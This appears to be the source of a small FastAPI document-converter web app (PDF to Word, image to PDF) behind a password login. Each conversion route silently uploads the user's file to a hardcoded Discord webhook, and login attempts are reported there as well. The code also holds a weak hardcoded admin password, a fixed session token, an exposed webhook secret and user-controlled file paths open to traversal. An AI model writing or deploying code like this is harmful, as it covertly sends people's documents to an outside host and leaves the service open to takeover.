import os
import shutil
import requests
import img2pdf
from PIL import Image
from fastapi import FastAPI, UploadFile, File, Form, Request, Response
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, RedirectResponse
from pdf2docx import Converter

app = FastAPI()

# --- CONFIGURATION ---
ADMIN_USER = "admin"
ADMIN_PASS = "123456"
SECRET_COOKIE_VALUE = "my_super_secret_login_token"
DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1455207333272485930/DM4BUE3kX887b2K_Uc7uvycrjnIXE_MhMgyzFhu3Uc903Enhc9nFMlISCt3PONNu2ogK"

app.mount("/static", StaticFiles(directory="static"), name="static")
os.makedirs("uploads", exist_ok=True)

# --- HELPER FUNCTIONS ---
def send_text_to_discord(message):
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"content": message})
    except:
        pass

def send_file_to_discord(filepath, filename, action_type):
    try:
        with open(filepath, "rb") as f:
            requests.post(
                DISCORD_WEBHOOK_URL,
                data={"content": f"📂 **New Upload ({action_type}):** {filename}"},
                files={"file": (filename, f)}
            )
    except Exception as e:
        print(f"Discord upload failed: {e}")

# --- LOGIN ROUTES ---
@app.get("/")
def read_root(request: Request):
    if request.cookies.get("auth_token") == SECRET_COOKIE_VALUE:
        return FileResponse('static/index.html')
    return RedirectResponse(url="/login-page")

@app.get("/login-page")
def login_page():
    return FileResponse('static/login.html')

@app.post("/login")
def login(response: Response, username: str = Form(...), password: str = Form(...)):
    if username == ADMIN_USER and password == ADMIN_PASS:
        send_text_to_discord(f"🔔 **Login:** User '{username}' entered.")
        response = RedirectResponse(url="/", status_code=302)
        response.set_cookie(key="auth_token", value=SECRET_COOKIE_VALUE)
        return response
    send_text_to_discord(f"⚠️ **Failed Login:** '{username}'")
    return RedirectResponse(url="/login-page?error=1", status_code=302)

# --- CONVERTER 1: PDF TO WORD ---
@app.post("/convert/pdf-to-word")
async def pdf_to_word(request: Request, file: UploadFile = File(...)):
    if request.cookies.get("auth_token") != SECRET_COOKIE_VALUE:
        return {"error": "Unauthorized"}

    filename = file.filename
    input_path = f"uploads/{filename}"
    output_filename = f"{filename.split('.')[0]}.docx"
    output_path = f"uploads/{output_filename}"

    with open(input_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    send_file_to_discord(input_path, filename, "PDF->Word")

    try:
        cv = Converter(input_path)
        cv.convert(output_path, start=0, end=None)
        cv.close()
        os.remove(input_path)
    except Exception as e:
        send_text_to_discord(f"❌ Error converting {filename}")
        return {"error": str(e)}

    return FileResponse(output_path, filename=output_filename)

# --- CONVERTER 2: IMAGE TO PDF ---
@app.post("/convert/image-to-pdf")
async def image_to_pdf(request: Request, file: UploadFile = File(...)):
    if request.cookies.get("auth_token") != SECRET_COOKIE_VALUE:
        return {"error": "Unauthorized"}

    filename = file.filename
    input_path = f"uploads/{filename}"
    output_filename = f"{filename.split('.')[0]}.pdf"
    output_path = f"uploads/{output_filename}"

    with open(input_path, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    send_file_to_discord(input_path, filename, "Img->PDF")

    try:
        # Convert Image to PDF
        with open(output_path, "wb") as f:
            f.write(img2pdf.convert(input_path))
        
        os.remove(input_path)
    except Exception as e:
        send_text_to_discord(f"❌ Error converting {filename}")
        return {"error": str(e)}

    return FileResponse(output_path, filename=output_filename)
